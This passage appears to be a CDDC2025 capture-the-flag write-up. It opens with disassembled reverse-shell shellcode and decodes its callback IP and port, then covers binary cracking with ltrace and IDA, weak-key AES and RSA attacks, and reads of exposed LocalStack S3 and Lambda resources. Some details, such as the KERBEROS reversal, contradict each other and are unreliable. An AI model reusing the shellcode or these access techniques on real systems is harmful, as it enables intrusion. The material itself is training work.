0x0000000000000117:  89 E0                   mov    eax, esp
0x0000000000000119:  4E                      dec    esi
0x000000000000011a:  56                      push   esi
0x000000000000011b:  46                      inc    esi
0x000000000000011c:  FF 30                   push   dword ptr [eax]
0x000000000000011e:  68 08 87 1D 60          push   0x601d8708
0x0000000000000123:  FF D5                   call   ebp
0x0000000000000125:  BB F0 B5 A2 56          mov    ebx, 0x56a2b5f0
0x000000000000012a:  68 A6 95 BD 9D          push   0x9dbd95a6
0x000000000000012f:  FF D5                   call   ebp
0x0000000000000131:  3C 06                   cmp    al, 6
0x0000000000000133:  7C 0A                   jl     0x13f
0x0000000000000135:  80 FB E0                cmp    bl, 0xe0
0x0000000000000138:  75 05                   jne    0x13f
0x000000000000013a:  BB 47 13 72 6F          mov    ebx, 0x6f721347
0x000000000000013f:  6A 00                   push   0
0x0000000000000141:  53                      push   ebx
0x0000000000000142:  FF D5                   call   ebp
```

We find the following interesting instruction:

```text
0x00000000000000c2:  68 02 00 11 67    push 0x67110002
```

The instruction `push 0x67110002` pushes a 4-byte value onto the stack. Due to little-endian byte order used on x86 systems, this value ends up in memory as: `02 00 11 67`.  

This matches the layout of a `sockaddr_in` structure:

```c
struct sockaddr_in {
    short sin_family; // 2 bytes
    unsigned short sin_port; // 2 bytes
    struct in_addr sin_addr; // 4 bytes
};
```

So:
- `0x0002` = AF_INET (address family, IPv4)
- `0x1167` = Port, in network byte order → Decimal: 4455

Shortly after the push instruction, we find:  

```text
0x00000000000000c7:  68 fa 19 a8 c0    push 0xc0a819fa
```

Again, little-endian byte order means the bytes on the stack are: `FA 19 A8 C0`. This corresponds to the IP address: `192.168.25.250`.  

The IP address is `192.168.25.250` and the port is `4455`. Submitting this, we get the flag.  

The flag is: `CDDC2025{GreatJOB_Deobfuscating_PowerShell_reverse_shell_payload}`

## Reverse Engineering

### CHIMERA

We get a file `CHIMERA`. 

```bash
$ file CHIMERA
CHIMERA: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a9f2b135fb8cfd8194493c429c43207624a942a3, for GNU/Linux 3.2.0, not stripped
```

We put this executable into IDA to disassemble it, and we found the answer, `Ch!m3rA_2o25!` Submitting it we get the flag.

```bash
$ ./CHIMERA
Half-lion, half-goat, with a snake tail...
What's the password?
> Ch!m3rA_2o25!
DEBUG: length = 13
buf[0] = 'C' (67)
buf[1] = 'h' (104)
buf[2] = '!' (33)
buf[3] = 'm' (109)
buf[4] = '3' (51)
buf[5] = 'r' (114)
buf[6] = 'A' (65)
buf[7] = '_' (95)
buf[8] = '2' (50)
buf[9] = 'o' (111)
buf[10] = '2' (50)
buf[11] = '5' (53)
buf[12] = '!' (33)
Congrats! Submit this value on the challenge site
```

The flag is: `CDDC2025{ChiMeraisaMother}`

### Uandme

Riddle: What comes once in a minute, twice in a moment, but never in a thousand years?

We are given a file `Uandm3`. It is also an executable.

```bash
$ file Uandm3
Uandm3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b628dd0b00b64577cba1863adcad1a1e87e864b5, for GNU/Linux 3.2.0, not stripped
```

We use `ltrace` and we found the answer:

```bash
$ ltrace ./Uandm3

__libc_start_main(0x80490cd, 1, 0xffda3634, 0 <unfinished ...>
strlen("oryhf|e6usxqn")                                                                                 = 13
printf("Enter key: ")                                                                                   = 11
fgets(Enter key:
"\n", 32, 0xf7ee7620)                                                                             = 0xffda3540
strcspn("\n", "\n")                                                                                     = 0
strcmp("", "lovecyb3rpunk")                                                                             = -1
puts("Incorrect key!"Incorrect key!
)                                                                                  = 15
+++ exited (status 0) +++

$ ./Uandm3
Enter key: lovecyb3rpunk
Congrats! Submit this value on the challenge site
```

Submitting `lovecyb3rpunk` as answer, we get the flag.

The flag is: `CDDC2025{cyberPUNNNKK3yb0000ard}`

### TheBOX

Riddle: The more you take, the more you leave behind. What am I?

Using the similar method as the challenge above, we get the riddle answer `thisisaVAAMpir3B0x`. Submitting this, we get the flag.

The flag is: `CDDC2025{helloiamCoffinNotTHEBOX}`

### ECHO

Riddle: I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I?

Using the similar method as the challenge above, we get the riddle answers `ECCHHHOO00secret` and `F00OO0oTSt33Ap`. Submitting this, we get the flag.

The flag is: `CDDC2025{whatisthEEEECCCHH0echo}`

### HOmeTradingSystem

Answer format : 
- Use the long name
- Use lowercase
- No space

HTS  
Many languages, yet I stand as one,  
A rule for all, uniting the run.  
For .NET I make things right,  
What am I, shining bright?  

Submitting `commonlanguagespecification` as riddle answer, we get a file `clsHTS.exe`. When we run `strings` on it and attempt to open it using PE-bear. Under `Strings` tab, we can see the visible strings, and we found a base64 string: `UTBSRVF6SXdNalY3UzBWU1FrVlNUMU11VGtWVWZRbz0K`

When we decode it, we get another base64 string: `Q0REQzIwMjV7S0VSQkVST1MuTkVUfQo=`. When we decode this base64 string, we get the flag.

The flag is: `CDDC2025{KERBEROS.NET}`

### WOLVES

Riddle: I move in packs, howl at night, and vanish in the trees. What am I?

We get a file `WOLVES`. We put this executable into IDA to disassemble it.  

**Step 1: Analyzing `main()`**  
The `main()` function contains the following important elements:
1. Displays a **hint**: `"Wolves speak not in words, but in twisted logic."`
2. Accepts **user input** (limited to 64 characters) using `fgets()`.
3. Calls `validate(s)`, which determines whether the input is correct.
4. If `validate(s)` returns **true**, it prints the success message; otherwise, it denies access.

At this point, we know the logic transformation happens in `validate()`, so reversing it becomes our next goal.

**Step 2: Understanding `validate()`**  
The `validate()` function pseudocode (generated using IDA):
- Checks that the input string has **exactly 8 characters**.
- Defines an array `v2[]`, which contains a list of predefined values:
  ```c
  v2[0] = 87; v2[1] = 104; v2[2] = 108; v2[3] = 119;
  v2[4] = 96; v2[5] = 99; v2[6] = 122; v2[7] = 121;
  ```
- Loops over each **character** of the input string and applies a transformation:
  ```c
  ((i + 3) ^ s[i]) + 1 == v2[i]
  ```
  If any character fails this check, the function returns `0` (failure).

**Step 3: Reversing the Transformation**  
To reconstruct the correct input string, we solve for `s[i]`:  
`s[i] = ((v2[i] - 1) ^ (i + 3))`

Using this formula, we calculate:  

| `i`  | `v2[i]` | `v2[i] - 1` | `i + 3` | `s[i]` (Decoded) |
|------|--------|------------|--------|---------------|
| `0`  | `87`   | `86`       | `3`    | `U`           |
| `1`  | `104`  | `103`      | `4`    | `c`           |
| `2`  | `108`  | `107`      | `5`    | `n`           |
| `3`  | `119`  | `118`      | `6`    | `p`           |
| `4`  | `96`   | `95`       | `7`    | `X`           |
| `5`  | `99`   | `98`       | `8`    | `j`           |
| `6`  | `122`  | `121`      | `9`    | `p`           |
| `7`  | `121`  | `120`      | `10`   | `r`           |

Thus, the correct input is **"UcnpXjpr"**.

**Step 4: Submitting the Flag**  
After entering `"UcnpXjpr"`, the program validates the input and displays:  
`Congrats! Submit this value on the challenge site.`  
This means our recovered string serves as the flag for submission.  

The flag is: `CDDC2025{howlingUcnpXjpr}`

### TheGateKeeper

This time, we have 3 ELF files:

```bash
$ file KERBEROS*

KERBEROS:  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=62ce5dda596024fdf774ea3e71949af2f82bab7a, for GNU/Linux 3.2.0, not stripped
KERBEROS2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5f73a4c65793609ef7c42246c6894611cdd0ce27, for GNU/Linux 3.2.0, not stripped
KERBEROS3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=02242e4a129c07135f31e9518381fbb7bfa927b9, for GNU/Linux 3.2.0, not stripped
```

For `KERBEROS`:

We decompile using `ltrace` and we found a `check()` function verifies whether an input string matches `"sorebreKmynameis"` in reverse order. If the input does not match its reversed version, the function returns `0` (failure); otherwise, it returns `1` (success).

1. **String Length Reference**  
   - The function uses `strlen("sorebreKmynameis")` multiple times to ensure consistency.
   - This ensures the loop iterates exactly **17 times** (the length of `"sorebreKmynameis"`).

2. **Character-by-Character Comparison**  
   ```c
   v3 = *(_BYTE *)(v4 + a1);
   if ( v3 != aSorebrekmyname[strlen("sorebreKmynameis") - v4 - 1] )
       return 0;
   ```
   - The function compares each character of the input (`a1`) to the corresponding reversed character from `"sorebreKmynameis"`.
   - If any character does not match, the function exits with `0` (failure).

3. **Expected Input for Success**  
   - Since the function checks the reverse of `"sorebreKmynameis"`, the correct input is `"siyemanKerberos"`.

For `KERBEROS2` and `KERBEROS3`:  
We use `ltrace` and we found the string that it was comparing against. They are `!KEBRE2025` and `CTMR]qmpc`pcI` respectively.
  
Combining the strings found, we submit: ```siemanymKerberos!KEBRE2025CTMR]qmpc`pcI``` to get the flag.

The flag is: ```CDDC2025{CTMR]qmpc`pcISKerberos_LOVE}```

### BEAR

This time we are given 2 ELF files. Similarly, we use `ltrace` and we found the strings that the ELF files was comparing against. `polarBEAR2025` from `BEAR_1` and `shadow` from `bEAR_TWO`.

Submitting the combined string, `polarBEAR2025shadow`, we get the flag.

The flag is: `CDDC2025{polarBEARshaDD0ww}`

## Binary Exploitation

### TH3BRAV3 [UNSOLVED]

We get an ELF file `TH3BRAV3`

```bash
$ file TH3BRAV3

TH3BRAV3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, 
interpreter /lib/ld-linux.so.2, BuildID[sha1]=54866545ebf64c016e22d71d49d33aa7718b21c7, 
for GNU/Linux 3.2.0, not stripped
```

```bash
$ nc 52.76.13.43 8121

CDDC2025: Welcome, brave challenger! But first... who dares enter the CDDC2025 arena?
Legend says the flag lies beyond...
==>

[*] Intriguing name...
[*] Now prove your Skills and worth. Seek, and you may find....
(hint: secrets likes to hide in plain sight, Output is not always innocent.)

```

**THE SOLUTION FOR THIS IS NOT FOUND**

### CANUSAYHELLO [UNSOLVED]

**THE SOLUTION FOR THIS IS NOT FOUND**

## Cryptography

### AEz

We are given `chall.py`

```python
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

flag = b'CDDC2025{REDACTED}'
key = b'SuperSecureKey12'

# AES block size is 16 bytes

def encrypt(msg, key):
	iv = os.urandom(AES.block_size)
	cipher = AES.new(key, AES.MODE_CBC, iv)
	ciphertext = cipher.encrypt(pad(msg, AES.block_size))
	return (iv + ciphertext).hex()

print("Encrypted flag:", encrypt(flag, key))

# Encrypted flag: 7b0c7480f7fcde2af93cf1191b10de6bae350af01eec1acd2c455ec61f33c939234d0402bab5fb212ec3232410bd2e824e0b643506937426028f893cecaaceb63537415a5be021e23be6678a45922842
```

- The function encrypts `flag` using **AES-CBC** mode.
- A **random IV (Initialization Vector)** is prepended to the ciphertext.
- The key used is **`SuperSecureKey12`** (16 bytes, making it valid for AES-128).

Since AES-CBC requires both **IV and Key** for decryption:
1. **Extract the IV** → It's the **first 16 bytes** of the encrypted flag.
2. **Extract Ciphertext** → The remaining bytes.
3. **Use the same key & AES-CBC mode** to decrypt.
4. **Remove padding** (since padding was added before encryption).

We use the following code to decode:

```python
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Encrypted flag (hex string)
encrypted_flag_hex = "7b0c7480f7fcde2af93cf1191b10de6bae350af01eec1acd2c455ec61f33c939234d0402bab5fb212ec3232410bd2e824e0b643506937426028f893cecaaceb63537415a5be021e23be6678a45922842"

# Convert hex to bytes
encrypted_flag = bytes.fromhex(encrypted_flag_hex)

# Key used for encryption
key = b"SuperSecureKey12"

# Extract IV (first 16 bytes)
iv = encrypted_flag[:16]

# Extract actual ciphertext
ciphertext = encrypted_flag[16:]

# Decrypt using AES-CBC
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted_flag = unpad(cipher.decrypt(ciphertext), AES.block_size)

print("Decrypted Flag:", decrypted_flag.decode())
```

The flag is: `CDDC2025{AES_al5o_kn0wn_4s_4dvanc3d_3ncrypt1on_5yst3m}`

### persistence

This time is still AES, but now the key is not given.

```python
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

flag = b'CDDC2025{REDACTED}'
key = os.urandom(1)*AES.block_size

def encrypt(msg, key):
	iv = os.urandom(AES.block_size)
	cipher = AES.new(key, AES.MODE_CBC, iv)
	ciphertext = cipher.encrypt(pad(msg, AES.block_size))
	return (iv + ciphertext).hex()

print("Encrypted flag:", encrypt(flag, key))

# Encrypted flag: 2042d23ade667d1417a86c42cffb92b4be07835de9814b0a7fe41667120b23ed38518821e1d6f280b47187f4bca94ac18ab45689c302da2d24f1e46603a6904937a9d0a2ff306c509e74a3bd74547719
```

This encryption script introduces an issue due to the way the **key** is generated:  

Problem: Key Generation  

```python
key = os.urandom(1) * AES.block_size
```

- `os.urandom(1)` generates only 1 random byte, then multiplies it to AES.block_size (16 bytes).
- Instead of a proper 16-byte random key, this results in a repeating pattern (e.g., `b'\xXX' * 16`).
- This weakens encryption, making cryptanalysis easier.

Decryption Approach  

Since the key follows a repeating pattern, you can brute-force all 256 possible keys (0x00 to 0xFF) to find the correct one.  

```python
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Encrypted flag (hex string)
encrypted_flag_hex = "2042d23ade667d1417a86c42cffb92b4be07835de9814b0a7fe41667120b23ed38518821e1d6f280b47187f4bca94ac18ab45689c302da2d24f1e46603a6904937a9d0a2ff306c509e74a3bd74547719"
encrypted_flag = bytes.fromhex(encrypted_flag_hex)

# Extract IV (first 16 bytes)
iv = encrypted_flag[:16]
ciphertext = encrypted_flag[16:]

# Brute-force 256 possible keys
for i in range(256):
    key = bytes([i]) * AES.block_size
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_flag = unpad(cipher.decrypt(ciphertext), AES.block_size)
        if b'CDDC2025{' in decrypted_flag:
            print("Found key:", key.hex())
            print("Decrypted Flag:", decrypted_flag.decode())
            break
    except:
        pass  # Ignore padding errors
```

Run this brute-force script, and the flag is recovered.  

The flag is: `CDDC2025{th3_be5t_pr4ct1ce_15_to_us3_r4ndom1zed_k3ys}`  

### flipflop [UNSOLVED]

**THE SOLUTION FOR THIS IS NOT FOUND**

### pico

We are given the following information, parse them into an [online RSA solver](https://www.dcode.fr/rsa-cipher) and we get the flag:
```text
n = 96447536123714599857357041641853639792210978408536791457946321194407434846555639408345878035275752262026179153356146443938325810052844478533443293233686452399382911668320195948120610324069511198750090031207074487126737525198338926349492099583005572046092916650439504417928094879634372599661080753372180216393
e = 3
c = 10537941076436863809036025371064788413493618354386497905939750126676017819409943015609923991152875944094584318490447733911531626633331811265633720088507883711101783499560056173460757910637094814124365571845287192620592004928564890742024998211645384856402662839058372115063162721125

```

The flag is: `CDDC2025{sm4ll_e_b1g_n_3qu4ls_d1s4ster}`

### transmision

We are given the following information:
```text
c1 = 55464819101800015960404550628898850142432257539284115388750128355489305802770430311235394956550482076066373478371161697598138865665928968078236421184728655284871658559045075679822462570287438205467280947065488681328504627103423898643244970344633959081836280177516046164263264750357581643272941909002773355321
n1 = 88404189700803909002418367181822818724930457153225750415703638283489025768094894817540947830033415733754431790122664526005785058759681352559114278602707292577494517353211448143559911834164157865401860874718143962688757657281305792556185581149101064660654541569039200601865725670227559165659677501721591981007
e1 = 3
c2 = 46160063226146075391409811568908401224816624286491670177717182990972100227793330823498909185083141535503363234882281999932084694586966045371544162249260887987603375694685595294517901187150782488810591102376847747404243720719007441492035106314849004539567297198570665899542763483222483268870376723087987172018
n2 = 98765434734235505872139625090882824324237191272261319472814042401082626430588018064348112408559476738546735923990502275137482376629943872769821520602807373985290206028239048373046076031357899669222267756394504019714107964716863438076038779356698093136265858680679947501679910952683101556115976591556787296321
e2 = 3
c3 = 85804994895645201467078740918884426073719936254162808656058058260166221257998600251946384126778620907870109493558893798320221828965425914330458179011769764165570281661515954888338127664644470091508288551527794917310141763347640718118575704655140095756753728830092291216309603401620431442942406619583344491660
n3 = 105007721872966793076162609733188282389877100757079834642046887190542088359154720647498751723415384150911522866036182818269604755852302528548736401665198210101612233759734430614955158673244550228865729640665209952403732099590596465766460967735743063558948118814534069468236262738118690319055697605688601282367
e3 = 3
```

With RSA, we create two random prime numbers (p and q), and determine the modulus (N=pq). We encrypt a message with C=M^e(modN) and decrypt with M=C^d(modN), and where (e,N) is the encryption key and (d,N) is the decryption key. We can crack RSA with Chinese Remainder Theory (CRT), and where we create three ciphers with the same message and three different encryption keys. We will use CRT and logarithms to determine the original message. This is based on three moduli and three cipher values. The method we will outline is also known as the Håstad broadcast attack.

We parse into a [solver](https://asecuritysite.com/ctf/rsa_ctf02) for this, we get the flag.

The flag is: `CDDC2025{h4st4d_br04dc4st_4tt4ck_b3_c4r3ful_wh3n_s3nd1n9_a_br04dc4st}`

### compartido [UNSOLVED]

We are provided with a script:

```python
# The script used by Alice to encrypt the flag

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.number import long_to_bytes
import hashlib
import os

def encrypt(msg, shared_secret):
	# derive key
	key = hashlib.md5(long_to_bytes(shared_secret)).digest()

	# encrypt
	iv = os.urandom(AES.block_size)
	cipher = AES.new(key, AES.MODE_CBC, iv)
	ciphertext = cipher.encrypt(pad(msg, AES.block_size))

	# format data
	data = {}
	data['iv'] = iv.hex()
	data['encrypted_flag'] = ciphertext.hex()

	return data
```

**THE SOLUTION FOR THIS IS NOT FOUND**

### crackers

Hashing is a method that takes data and returns a fixed-sized string.
Hashing algorithms are one-way functions; meaning that once data is hashed, it is extremely difficult to retrieve the original input.
This is why passwords are stored in databases as hash format.

However, some hash values can be "reversed" using certain tools.
For this challenge, crack the following MD5 hash and wrap the answer in the flag format "CDDC2025{   }".

Hash: daeccf0ad3c1fc8c8015205c332f5b42

Using a [MD5 reverse calculator](http://reversemd5.com/), we get `apples'

The flag is: `CDDC2025{apples}`

### collision [UNSOLVED]

Dex said, "I made an app where you can get a flag, but you have to be a registered user."  
You replied, "Why do you leave the username and hashed passwords?"  
Dex said, "I mean, as long as they're hashed, you can't find out the original password; or can you?"  
nc 52.76.13.43 8082  

We are given the above and also a script:

```python
#!/usr/bin/env python3

from secret import FLAG

# my very original hash function!!1!
def my_hash(string):
	sum = 0
	for char in string:
		sum += ord(char)
	sum = sum % 2**24
	return str(sum).encode().hex()

# username & hashed passwords
user_database = {
	'admin' : '32323931',
	'user1' : '32303638',
	'user2' : '31333433',
}

logged_in = False

# main code
while True:
    print("""
        =================WELCOME=================
        1. Login
        2. Exit
        =========================================
        """)

    choose = input(">> ")

    if choose == "1":
        inp_username = input("Username: ")
        inp_password = input("Password: ")
        try:
        	if my_hash(inp_password) == user_database[inp_username]:
        		logged_in = True
        		print("Login successful!")
        	else:
        		assert 1 == 0	# raise error, go to "except" codeblock
        except:
            print("Username or Password might be wrong...")

    elif choose == "2":
        print("Good Bye!")
        exit(0)
            
    else:
        print("Choose correctly!")
        continue

    while logged_in:
        print(f"""
        ===========WELCOME BACK, {inp_username}============
        1. Get Flag
        2. Logout
        =========================================
        """)

        choose = input(">> ")

        if choose == "1":
            print(f"Here is your flag: {FLAG}")
            exit(0)

        elif choose == "2":
            print("Logging out...")
            logged_in = False
                
        else:
            print("Choose correctly!")
            continue
```

**THE SOLUTION FOR THIS IS NOT FOUND**

## Cloud Security

### EXPOSEDBINARY

Inspect the website, we found some binary values commented:

```binary
01001100 01101110 01010010 01101100 01100011 01101110 01001010 01101000    
01011010 01101101 00111001 01111001 01100010 01010011 00111001 00110000   
01011010 01011000 01001010 01111001 01011001 01010111 01011010 01110110  
01100011 01101101 00110000 01110101 01100100 01000111 01011010 01111010  
01100100 01000111 01000110 00110000 01011010 01010001 00111101 00111101
```

Decode from binary, decode again from base64, we get:
```text
.terraform/terraform.tfstate
```

We visit the link: `http://52.76.13.43:8151/.terraform/terraform.tfstate` and we found the flag.

The flag is: `CDDC2025{T3rraf0rm_ST4t3_3xposure_is_REAL}`

### IAM-EScAlAT10n

In this challenge, we were given access to an AWS S3 bucket hosted on a LocalStack instance at `http://52.76.13.43:8145/`. The goal was to retrieve the contents of `flag.txt` stored in the `ctf-escalation-bucket`.

```bash
$ aws --endpoint-url http://52.76.13.43:8145 s3 ls

2025-04-29 14:11:07 ctf-escalation-bucket
```

**Step 1: Setting Up AWS Credentials**  
Before interacting with the instance, we needed to configure our AWS CLI with test credentials:

```bash
$ aws configure
```
We set:
- **Access Key ID**: `test`
- **Secret Access Key**: `test`
- **Region**: `us-east-1`
- **Output Format**: `json`

**Step 2: Listing Objects in the S3 Bucket**  
To confirm the presence of files, we listed the bucket contents:
```bash
$ aws --endpoint-url http://52.76.13.43:8145 s3 ls s3://ctf-escalation-bucket
```
Output:
```
2025-04-29 14:11:07         66 flag.txt
```
This confirmed that `flag.txt` existed.

**Step 3: Retrieving the Flag**  
Attempting `aws --endpoint-url http://52.76.13.43:8145 s3 cat * s3://ctf-escalation-bucket` resulted in an error because `s3 cat` is not a valid AWS CLI command. Instead, we used:

**Option 1: Downloading the File**  

```bash
$ aws --endpoint-url http://52.76.13.43:8145 s3 cp s3://ctf-escalation-bucket/flag.txt .
$ cat flag.txt
```

**Option 2: Using S3 API**  

```bash
$ aws --endpoint-url http://52.76.13.43:8145 s3api get-object --bucket ctf-escalation-bucket --key flag.txt flag.txt
$ cat flag.txt
```

Either method successfully retrieved the flag.  

The flag is: `CDDC2025{iam_So_privileged_because_escalation_is_very_successful}`

### L4mbDa-S3cret5  

The goal of this challenge is to run the lambda function. So we first check what functions are available: 

```bash
$ aws --endpoint-url http://52.76.13.43:8146/ lambda list-functions

{
    "Functions": [
        {
            "FunctionName": "SecretFunction",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:SecretFunction",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::000000000000:role/lambda-role",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 358,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2025-04-29T06:15:33.816121+0000",
            "CodeSha256": "FKcpoynPIBAWOxw0PEfVbkn4Zipzk2DF9VyR7KKSWgo=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "41628b93-11c9-4b1f-9bdb-cd5e1b10b613",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/SecretFunction"
            }
        },
        {
            "FunctionName": "my_function",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:my_function",
            "Runtime": "python3.10",
            "Role": "arn:aws:iam::000000000000:role/lambda-role",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 326,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2025-05-02T16:31:21.050039+0000",
            "CodeSha256": "KX3//UZmG7Xq+1k9Y7prf9GwH1jyFikgsr4bNKkNIX0=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "b33be056-75aa-4996-89d3-a6044938c80f",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/my_function"
            }
        },
        {
            "FunctionName": "my_function_a",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:my_function_a",
            "Runtime": "python3.10",
            "Role": "arn:aws:iam::000000000000:role/lambda-role",
            "Handler": "code.lambda_handler",
            "CodeSize": 326,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2025-05-02T16:32:33.595882+0000",
            "CodeSha256": "KX3//UZmG7Xq+1k9Y7prf9GwH1jyFikgsr4bNKkNIX0=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "d71a1d0b-1995-4574-8649-829724eb1a77",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/my_function_a"
            }
        },
        {
            "FunctionName": "my_function_b",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:my_function_b",
            "Runtime": "python3.10",
            "Role": "arn:aws:iam::000000000000:role/lambda-role",
            "Handler": "code.lambda_handler",
            "CodeSize": 288,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2025-05-02T16:46:15.457944+0000",
            "CodeSha256": "1ckG7rbfOoUjJJyVtU2flqlrvmJGLfQhV9TenmWgfH8=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "9f8a36a3-7cc6-4f9a-9f33-62fac23bbe25",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/my_function_b"
            }
        },
        {
            "FunctionName": "my-function",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:my-function",
            "Runtime": "python3.8",
            "Role": "arn:aws:iam::000000000000:role/lambda-role",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 276,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2025-05-08T05:32:01.920726+0000",
            "CodeSha256": "VfyAAQqa0q+I4tYCpQqpDtqfFAHy8rhS4cPDeO4bTDM=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "88aae009-3269-49e0-b86a-b67182a0370c",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/my-function"
            }
        },
        {
            "FunctionName": "my-lambda-function",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:my-lambda-function",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::000000000000:role/lambda-role",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 237,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2025-05-12T10:33:47.152049+0000",
            "CodeSha256": "z18ModJlGj/0pkaO8DGbotqfkokbnyfthbG2Ef0iIpo=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "c7cf3133-70fa-4d35-94fb-c0b1375ad97e",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/my-lambda-function"
            }
        }
    ]
}
```

We found that there is a `SecretFunction`, so we run the function and output it to `output.json`, and we found the flag in it:

```bash
$ aws --endpoint-url http://52.76.13.43:8146/ lambda invoke --function-name SecretFunction output.json

{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}

$ cat output.json

{"statusCode": 200, "body": "\"Check the code for secrets...CDDC2025{Superh4rdcoded_lambda_phy_app_sol0n_secret}\""}
```

The flag is: `CDDC2025{Superh4rdcoded_lambda_phy_app_sol0n_secret}`

### l33aky-s3-Buck3t  

This challenge describes that one of the buckets  contains the flag, so we first check the list of buckets:

```bash
$ aws --endpoint-url http://52.76.13.43:8147/ s3 ls
2025-04-29 14:19:48 leaky-ctf-bucket
```

Next, we list the contents inside the bucket, and find the flag:

```bash
$ aws --endpoint-url http://52.76.13.43:8147/ s3 ls s3://leaky-ctf-bucket
                           PRE kali/
2025-04-29 14:19:49         33 flag.txt

$ aws --endpoint-url http://52.76.13.43:8147/ s3 cp s3://leaky-ctf-bucket/flag.txt .
download: s3://leaky-ctf-bucket/flag.txt to ./flag.txt

$ cat flag.txt
CDDC2025{l3aky_s3_buck3t_4cc355}
```

The flag is: `CDDC2025{l3aky_s3_buck3t_4cc355}`

### 55rf-m3tadat4  



The flag is: ``
